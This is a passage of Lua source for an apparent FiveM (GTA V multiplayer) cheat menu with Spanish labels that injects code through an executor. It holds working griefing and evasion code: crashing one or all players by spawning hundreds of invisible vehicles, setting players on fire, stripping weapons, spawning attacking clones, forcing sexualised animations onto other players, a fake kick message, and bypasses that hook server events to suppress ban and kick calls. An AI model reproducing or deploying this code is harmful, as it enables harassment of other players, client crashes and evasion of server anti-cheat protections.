                                        SetEntityVelocity(veh, 0.0, 0.0, 0.0)
                                    end
                                end
                            end
                        end
                    end
                end)
        ]], targetServerId))
    end
end

Actions.copyAppearanceItem = FindItem("En linea", "Troleo", "Copiar apariencia")
if Actions.copyAppearanceItem then
    Actions.copyAppearanceItem.onClick = function()
        Menu.ActionCopyAppearance()
    end
end

Actions.crashItem = FindItem("En linea", "Troleo", "Crashear jugador")
if Actions.crashItem then
    Actions.crashItem.onClick = function(value) Menu.ActionCrashPlayer(value) end
end

Actions.invalidHookItem = FindItem("En linea", "Troleo", "Invalid Hook Kick")
if Actions.invalidHookItem then
    Actions.invalidHookItem.onClick = function() Menu.ActionInvalidHookKick() end
end

Actions.crashAllItem = FindItem("En linea", "todos", "Crashear todos")
if Actions.crashAllItem then
    Actions.crashAllItem.onClick = function() Menu.ActionCrashAll() end
end

Actions.fireAllItem = FindItem("En linea", "todos", "Incendiar todos")
if Actions.fireAllItem then
    Actions.fireAllItem.onClick = function() Menu.ActionFireAll() end
end

Actions.stealAllItem = FindItem("En linea", "todos", "Robar armas todos")
if Actions.stealAllItem then
    Actions.stealAllItem.onClick = function() Menu.ActionStealWeaponsAll() end
end

Actions.bypassEntityItem = FindItem("Varios", "Bypasses", "Bypass entidades cliente")
if Actions.bypassEntityItem then
    Actions.bypassEntityItem.onClick = function() Bypass.EntityClientBypass("any") end
end

Actions.bypassEventItem = FindItem("Varios", "Bypasses", "Bypass validacion eventos")
if Actions.bypassEventItem then
    Actions.bypassEventItem.onClick = function() Bypass.EventValidationBypass("any") end
end

Actions.crashAllItem = FindItem("En linea", "todos", "Crashear todos")
if Actions.crashAllItem then
    Actions.crashAllItem.onClick = function() Menu.ActionCrashAll() end
end

Actions.fireAllItem = FindItem("En linea", "todos", "Incendiar todos")
if Actions.fireAllItem then
    Actions.fireAllItem.onClick = function() Menu.ActionFireAll() end
end

Actions.stealAllItem = FindItem("En linea", "todos", "Robar armas todos")
if Actions.stealAllItem then
    Actions.stealAllItem.onClick = function() Menu.ActionStealWeaponsAll() end
end

Actions.bypassEntityItem = FindItem("Varios", "Bypasses", "Bypass entidades cliente")
if Actions.bypassEntityItem then
    Actions.bypassEntityItem.onClick = function() Bypass.EntityClientBypass("any") end
end

Actions.bypassEventItem = FindItem("Varios", "Bypasses", "Bypass validacion eventos")
if Actions.bypassEventItem then
    Actions.bypassEventItem.onClick = function() Bypass.EventValidationBypass("any") end
end

Actions.cloneItem = FindItem("En linea", "Troleo", "Clonar infinitamente")
if Actions.cloneItem then
    Actions.cloneItem.onClick = function() Menu.ActionCloneInfinite() end
end

Actions.fireItem = FindItem("En linea", "Troleo", "Incendiar jugador")
if Actions.fireItem then
    Actions.fireItem.onClick = function() Menu.ActionSetOnFire() end
end

Actions.stealItem = FindItem("En linea", "Troleo", "Robar armas")
if Actions.stealItem then
    Actions.stealItem.onClick = function() Menu.ActionStealWeapons() end
end

Actions.banPlayerItem = FindItem("En linea", "Troleo", "Banear jugador")
if Actions.banPlayerItem then
    Actions.banPlayerItem.onClick = function(value)
        banPlayerActive = value
        if value then
            if banPlayerThread then
                return
            end
            banPlayerThread = CreateThread(function()
                local originalCoords = nil
                local teleported = false
                while banPlayerActive do
                    local targetServerId = Menu.SelectedPlayer
                    if not targetServerId then
                        Wait(1000)
                    else
                        local clientId = GetPlayerFromServerId(targetServerId)
                        if clientId and clientId ~= -1 then
                            local targetPed = GetPlayerPed(clientId)
                            if targetPed and DoesEntityExist(targetPed) then
                                local myPed = PlayerPedId()
                                if myPed then
                                    local myCoords = GetEntityCoords(myPed)
                                    local targetCoords = GetEntityCoords(targetPed)
                                    if myCoords and targetCoords then
                                        local distance = #(myCoords - targetCoords)

                                        if distance > 10.0 and not originalCoords then
                                            originalCoords = myCoords
                                            local angle = math.random() * 2 * math.pi
                                            local radiusOffset = math.random(5, 9)
                                            local xOffset = math.cos(angle) * radiusOffset
                                            local yOffset = math.sin(angle) * radiusOffset
                                            local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                                            SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                            SetEntityVisible(myPed, false, 0)
                                            teleported = true
                                            Wait(100)
                                        end

                                        local curTargetCoords = GetEntityCoords(targetPed)
                                        if curTargetCoords then
                                            ClearPedTasksImmediately(myPed)
                                            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                                            Wait(100)
                                            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                                            Wait(100)
                                            DetachEntity(myPed, true, true)
                                            Wait(200)
                                        end
                                    end
                                end
                            end
                        end
                    end
                    Wait(200)
                end

                local myPed = PlayerPedId()
                if myPed then
                    ClearPedTasksImmediately(myPed)
                                        if originalCoords then
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                        Wait(100)
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                    end
                    if teleported then
                        SetEntityVisible(myPed, true, 0)
                    end
                end
                banPlayerThread = nil
            end)
        else
            banPlayerActive = false
        end
    end
end

Actions.shootPlayerItem = FindItem("En linea", "Troleo", "Disparar a jugador")
if Actions.shootPlayerItem then
    Actions.shootPlayerItem.onClick = function()
        Menu.ActionShootPlayer()
    end
end

Actions.launchAllItem = FindItem("En linea", "todos", "Lanzar todos")
if Actions.launchAllItem then
    Actions.launchAllItem.onClick = function()
        Menu.ActionLaunchAll()
    end
end

                    Actions.blackHoleItem = FindItem("En linea", "Troleo", "Agujero negro")
                    if Actions.blackHoleItem then
                        Actions.blackHoleItem.onClick = function(value)
                            if value then
                                Menu.ActionBlackHole()
                            else
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        _G.black_hole_active = false
                                        _G.black_hole_vehicles = {}
                                        _G.black_hole_target_player = nil
                                        _G.black_hole_last_scan = 0
                                    ]])
                                else
                                    rawset(_G, 'black_hole_active', false)
                                    rawset(_G, 'black_hole_vehicles', {})
                                    rawset(_G, 'black_hole_target_player', nil)
                                    rawset(_G, 'black_hole_last_scan', 0)
                                end
                            end
                        end
                    end

                    Actions.twerkOnThemItem = FindItem("En linea", "Troleo", "twerk")
                    if Actions.twerkOnThemItem then
                        Actions.twerkOnThemItem.onClick = function(value)
                            if not Menu.SelectedPlayer then
                                Actions.twerkOnThemItem.value = false
                                return
                            end

                            local targetServerId = Menu.SelectedPlayer

                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    local targetServerId = %d
                                    local playerPed = PlayerPedId()

                                    local targetPlayerId = nil
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(player) == targetServerId then
                                            targetPlayerId = player
                                            break
                                        end
                                    end

                                    if not targetPlayerId then return end

                                    local targetPed = GetPlayerPed(targetPlayerId)
                                    if not DoesEntityExist(targetPed) then return end

                                    if rawget(_G, 'twerk_active') then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        rawset(_G, 'twerk_active', false)
                                    else
                                        rawset(_G, 'twerk_active', true)
                                        if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                                            RequestAnimDict("switch@trevor@mocks_lapdance")
                                            while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                                                Wait(0)
                                            end
                                        end

                                        AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                    end
                                ]], targetServerId))
                            end
                        end
                    end

                    Actions.backshotsItem = FindItem("En linea", "Troleo", "follar")
                    if Actions.backshotsItem then
                        Actions.backshotsItem.onClick = function(value)
                            if not Menu.SelectedPlayer then
                                Actions.backshotsItem.value = false
                                return
                            end

                            local targetServerId = Menu.SelectedPlayer

                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    local targetServerId = %d
                                    local playerPed = PlayerPedId()

                                    local targetPlayerId = nil
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(player) == targetServerId then
                                            targetPlayerId = player
                                            break
                                        end
                                    end

                                    if not targetPlayerId then return end

                                    local targetPed = GetPlayerPed(targetPlayerId)
                                    if not DoesEntityExist(targetPed) then return end

                                    if rawget(_G, 'backshots_active') then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        rawset(_G, 'backshots_active', false)
                                    else
                                        rawset(_G, 'backshots_active', true)
                                        if not HasAnimDictLoaded("rcmpaparazzo_2") then
                                            RequestAnimDict("rcmpaparazzo_2")
                                            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                                Wait(0)
                                            end
                                        end

                                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                    end
                                ]], targetServerId))
                            end
                        end
                    end

                    Actions.wankOnThemItem = FindItem("En linea", "Troleo", "paja")
                    if Actions.wankOnThemItem then
                        Actions.wankOnThemItem.onClick = function(value)
                            if value then
                                if not Menu.SelectedPlayer then
                                    Actions.wankOnThemItem.value = false
                                    return
                                end

                                local targetServerId = Menu.SelectedPlayer

                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", string.format([[
                                        local targetServerId = %d
                                        local playerPed = PlayerPedId()

                                        local targetPlayerId = nil
                                        for _, player in ipairs(GetActivePlayers()) do
                                            if GetPlayerServerId(player) == targetServerId then
                                                targetPlayerId = player
                                                break
                                            end
                                        end

                                        if not targetPlayerId then return end

                                        local targetPed = GetPlayerPed(targetPlayerId)
                                        if not DoesEntityExist(targetPed) then return end

                                        rawset(_G, 'wank_active', true)
                                        rawset(_G, 'wank_target_ped', targetPed)

                                        if not HasAnimDictLoaded("mp_player_int_upperwank") then
                                            RequestAnimDict("mp_player_int_upperwank")
                                            while not HasAnimDictLoaded("mp_player_int_upperwank") do
                                                Wait(0)
                                            end
                                        end

                                        AttachEntityToEntity(playerPed, targetPed, 4103, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(playerPed, "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, 100000, 51, 1.0, false, false, false)

                                        CreateThread(function()
                                            while rawget(_G, 'wank_active') do
                                                Wait(0)

                                                local myPed = playerPed
                                                local targetPed = rawget(_G, 'wank_target_ped')

                                                if not DoesEntityExist(myPed) or not DoesEntityExist(targetPed) then
                                                    rawset(_G, 'wank_active', false)
                                                    rawset(_G, 'wank_target_ped', nil)
                                                    break
                                                end

                                                if not IsEntityAttachedToEntity(myPed, targetPed) then
                                                    AttachEntityToEntity(myPed, targetPed, 4103, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                end

                                                if not IsEntityPlayingAnim(myPed, "mp_player_int_upperwank", "mp_player_int_wank_01", 3) then
                                                    TaskPlayAnim(myPed, "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, 100000, 51, 1.0, false, false, false)
                                                end
                                            end

                                            if DoesEntityExist(playerPed) then
                                                if IsEntityAttached(playerPed) then
                                                    DetachEntity(playerPed, true, false)
                                                end
                                                ClearPedTasksImmediately(playerPed)
                                            end
                                        end)
                                    ]], targetServerId))
                                end
                            else
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        rawset(_G, 'wank_active', false)
                                        rawset(_G, 'wank_target_ped', nil)

                                        local playerPed = PlayerPedId()
                                        if DoesEntityExist(playerPed) then
                                            if IsEntityAttached(playerPed) then
                                                DetachEntity(playerPed, true, false)
                                            end
                                            ClearPedTasksImmediately(playerPed)
                                        end
                                    ]])
                                end
                            end
                        end
                    end

                    Actions.piggybackItem = FindItem("En linea", "Troleo", "caballito")
                    if Actions.piggybackItem then
                        Actions.piggybackItem.onClick = function(value)
                            if not Menu.SelectedPlayer then
                                Actions.piggybackItem.value = false
                                return
                            end

                            local targetServerId = Menu.SelectedPlayer

                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    local targetServerId = %d
                                    local playerPed = PlayerPedId()

                                    local targetPlayerId = nil
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(player) == targetServerId then
                                            targetPlayerId = player
                                            break
                                        end
                                    end

                                    if not targetPlayerId then return end

                                    local targetPed = GetPlayerPed(targetPlayerId)
                                    if not DoesEntityExist(targetPed) then return end

                                    if rawget(_G, 'piggyback_active') then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        rawset(_G, 'piggyback_active', false)
                                    else
                                        rawset(_G, 'piggyback_active', true)
                                        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                                Wait(0)
                                            end
                                        end

                                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                                    end
                                ]], targetServerId))
                            end
                        end
                    end

Menu.BugPlayerMode = "Bug"

function Menu.ActionBugPlayer()
    if not Menu.SelectedPlayer then return end

    local bugPlayerMode = Menu.BugPlayerMode or "Bug"
    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local bugPlayerMode = string.lower("%s")

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end

            if bugPlayerMode == "bug" then
                CreateThread(function()
                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)

                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then return end

                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                    Wait(150)

                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if NetworkGetEntityIsNetworked(closestVeh) then
                        NetworkRequestControlOfEntity(closestVeh)
                    end

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(100)

                    for i = 1, 30 do
                        DetachEntity(closestVeh, true, true)
                        Wait(5)
                        AttachEntityToEntityPhysically(closestVeh, targetPed, 0, 0, 0, 1800.0, 1600.0, 1200.0, 300.0, 300.0, 300.0, true, true, true, false, 0)
                        Wait(5)
                    end
                end)
            elseif bugPlayerMode == "lanzar" then
                CreateThread(function()
                    local clientId = GetPlayerFromServerId(targetServerId)
                    if not clientId or clientId == -1 then
                        return
                    end

                    local targetPed = GetPlayerPed(clientId)
                    if not targetPed or not DoesEntityExist(targetPed) then
                        return
                    end

                    local myPed = PlayerPedId()
                    if not myPed then
                        return
                    end

                    local myCoords = GetEntityCoords(myPed)
                    local targetCoords = GetEntityCoords(targetPed)
                    if not myCoords or not targetCoords then
                        return
                    end

                   
                    local originalCoords = myCoords
                    local originalHeading = GetEntityHeading(myPed)
                    local distance = #(myCoords - targetCoords)
                    local teleported = false

                    if distance > 10.0 then
                        local angle = math.random() * 2 * math.pi
                        local radiusOffset = math.random(5, 9)
                        local xOffset = math.cos(angle) * radiusOffset
                        local yOffset = math.sin(angle) * radiusOffset
                        local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                        SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                        SetEntityVisible(myPed, false, 0)
                        teleported = true
                        Wait(30)
                    end

                    ClearPedTasksImmediately(myPed)
                    for i = 1, 10 do
                        if not DoesEntityExist(targetPed) then
                            break
                        end

                        local curTargetCoords = GetEntityCoords(targetPed)
                        if not curTargetCoords then
                            break
                        end

                        SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                        Wait(30)
                        AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                        Wait(30)
                        DetachEntity(myPed, true, true)
                        Wait(50)
                    end

                    Wait(200)
                    ClearPedTasksImmediately(myPed)

                    
                    SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false)
                    Wait(100)
                    SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                    SetEntityHeading(myPed, originalHeading)
                    
                    if teleported then
                        SetEntityVisible(myPed, true, 0)
                    end
                end)
            elseif bugPlayerMode == "lanzar fuerte" then
                CreateThread(function()
                    local clientId = GetPlayerFromServerId(targetServerId)
                    if not clientId or clientId == -1 then
                        return
                    end

                    local targetPed = GetPlayerPed(clientId)
                    if not targetPed or not DoesEntityExist(targetPed) then
                        return
                    end

                    local myPed = PlayerPedId()
                    if not myPed then
                        return
                    end

                    local myCoords = GetEntityCoords(myPed)
                    local targetCoords = GetEntityCoords(targetPed)
                    if not myCoords or not targetCoords then
                        return
                    end

                    
                    local originalCoords = myCoords
                    local originalHeading = GetEntityHeading(myPed)
                    local distance = #(myCoords - targetCoords)
                    local teleported = false

                    if distance > 10.0 then
                        local angle = math.random() * 2 * math.pi
                        local radiusOffset = math.random(5, 9)
                        local xOffset = math.cos(angle) * radiusOffset
                        local yOffset = math.sin(angle) * radiusOffset
                        local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                        SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                        SetEntityVisible(myPed, false, 0)
                        teleported = true
                        Wait(30)
                    end

                    for cycle = 1, 8 do
                        ClearPedTasksImmediately(myPed)
                        for i = 1, 10 do
                            if not DoesEntityExist(targetPed) then
                                break
                            end

                            local curTargetCoords = GetEntityCoords(targetPed)
                            if not curTargetCoords then
                                break
                            end

                            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                            Wait(30)
                            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                            Wait(30)
                            DetachEntity(myPed, true, true)
                            Wait(50)
                        end

                        if cycle < 8 then
                            Wait(300)
                        end
                    end

                    Wait(200)
                    ClearPedTasksImmediately(myPed)

                    
                    SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false)
                    Wait(100)
                    SetEntityCoordsNoOffset(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                    SetEntityHeading(myPed, originalHeading)
                    
                    if teleported then
                        SetEntityVisible(myPed, true, 0)
                    end
                end)
            elseif bugPlayerMode == "enganchar" then
                CreateThread(function()
                    local function reqCtrl(entity)
                        if not entity or entity == 0 then return false end
                        if not NetworkGetEntityIsNetworked(entity) then
                            NetworkRegisterEntityAsNetworked(entity)
                        end
                        if NetworkGetEntityIsNetworked(entity) then
                            NetworkRequestControlOfEntity(entity)
                            local attempts = 0
                            while not NetworkHasControlOfEntity(entity) and attempts < 30 do
                                Wait(10)
                                attempts = attempts + 1
                                NetworkRequestControlOfEntity(entity)
                            end
                            return NetworkHasControlOfEntity(entity)
                        end
                        return false
                    end

                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end

                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end

                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then return end

                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if not reqCtrl(closestVeh) then return end

                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                    Wait(120)

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(50)

                    local targetVeh = GetVehiclePedIsIn(targetPed, false)
                    local targetEntity = targetVeh ~= 0 and DoesEntityExist(targetVeh) and targetVeh or targetPed

                        AttachEntityToEntityPhysically(
                        closestVeh, targetEntity,
                            0, 0.0, 0.0, 0.0,
                            0.0, 0.0, 0.0,
                            0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                        )

                    Wait(100)

                        AttachEntityToEntityPhysically(
                        closestVeh, targetEntity,
                            0, 0.0, 0.0, 0.0,
                            0.0, 0.0, 0.0,
                            0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                        )
                end)
            end
        ]], targetServerId, bugPlayerMode))
    end
end

local crashPlayerActive = false
local crashPlayerThread = nil

function Menu.ActionInvalidHookKick()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                
                -- Enviar evento inválido al jugador (simulación de invalid hook)
                TriggerServerEvent("chat:addMessage", {args = {"[Sistema] El jugador " .. GetPlayerName(targetPlayerId) .. " ha sido kickeado por Invalid Hook."}})
                TriggerServerEvent("playerDropped", "Invalid Hook Detected")
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionCrashAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = [[
            CreateThread(function()
                local players = GetActivePlayers()
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)
                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
                for _, model in ipairs(models) do
                    RequestModel(model)
                    while not HasModelLoaded(model) do Wait(0) end
                end
                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
                        local coords = GetEntityCoords(targetPed)
                        if #(coords - myCoords) > 50.0 then
                            for i = 1, 50 do
                                local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
                                SetEntityVisible(veh, false, false)
                                SetEntityCollision(veh, false, false)
                            end
                        end
                    end
                end
            end)
        ]]
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionFireAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = [[
            CreateThread(function()
                local players = GetActivePlayers()
                local myPed = PlayerPedId()
                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
                        local coords = GetEntityCoords(targetPed)
                        StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
                    end
                end
            end)
        ]]
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionStealWeaponsAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = [[
            CreateThread(function()
                local players = GetActivePlayers()
                local myPed = PlayerPedId()
                for _, player in ipairs(players) do
                    local targetPed = GetPlayerPed(player)
                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
                        RemoveAllPedWeapons(targetPed, true)
                    end
                end
            end)
        ]]
        Susano.InjectResource("any", code)
    end
end

function Bypass.EntityClientBypass(resource)
    Susano.InjectResource(resource, [[
        local originalSetEntityVisible = SetEntityVisible
        SetEntityVisible = function(entity, visible, p2)
            if entity == PlayerPedId() then return end
            return originalSetEntityVisible(entity, visible, p2)
        end
        local originalSetEntityCollision = SetEntityCollision
        SetEntityCollision = function(entity, toggle, keepPhysics)
            if entity == PlayerPedId() then return end
            return originalSetEntityCollision(entity, toggle, keepPhysics)
        end
    ]])
    print("^2[Bypass] Entidades por cliente activado")
end

function Bypass.EventValidationBypass(resource)
    Susano.InjectResource(resource, [[
        local originalTriggerServerEvent = TriggerServerEvent
        TriggerServerEvent = function(eventName, ...)
            if tostring(eventName):find("ban") or tostring(eventName):find("kick") or tostring(eventName):find("drop") then return end
            return originalTriggerServerEvent(eventName, ...)
        end
    ]])
    print("^2[Bypass] Validacion de eventos evadida")
end

function Menu.ActionCrashPlayer(value)
    crashPlayerActive = value
    if value then
        if crashPlayerThread then return end
        crashPlayerThread = CreateThread(function()
            while crashPlayerActive do
                if not Menu.SelectedPlayer then
                    Wait(1000)
                else
                    local targetServerId = Menu.SelectedPlayer
                    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                        local code = string.format([[
                            CreateThread(function()
                                local targetServerId = %d
                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end
                                if not targetPlayerId then return end
                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end
                                local coords = GetEntityCoords(targetPed)
                                
                                -- Evitar crashear a si mismo comprobando la distancia
                                local myPed = PlayerPedId()
                                local myCoords = GetEntityCoords(myPed)
                                if #(coords - myCoords) < 50.0 then return end
                                
                                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
                                for _, model in ipairs(models) do
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do Wait(0) end
                                end
                                for i = 1, 150 do
                                    local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
                                    SetEntityVisible(veh, false, false)
                                    SetEntityCollision(veh, false, false)
                                end
                            end)
                        ]], targetServerId)
                        Susano.InjectResource("any", code)
                    end
                    Wait(5000) -- Esperar antes de volver a inyectar para evitar sobrecarga local
                end
            end
            crashPlayerThread = nil
        end)
    end
end

function Menu.ActionCloneInfinite()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                local coords = GetEntityCoords(targetPed)
                local pedModel = GetEntityModel(targetPed)
                RequestModel(pedModel)
                while not HasModelLoaded(pedModel) do Wait(0) end
                for i = 1, 50 do
                    local clone = CreatePed(4, pedModel, coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z, 0.0, true, true)
                    ClonePedToTarget(targetPed, clone)
                    TaskCombatPed(clone, targetPed, 0, 16)
                    SetPedAsNoLongerNeeded(clone)
                end
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionSetOnFire()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                local coords = GetEntityCoords(targetPed)
                StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionStealWeapons()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
            CreateThread(function()
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                if not targetPlayerId then return end
                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then return end
                RemoveAllPedWeapons(targetPed, true)
            end)
        ]], targetServerId)
        Susano.InjectResource("any", code)
    end
end

function Menu.ActionCagePlayer()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

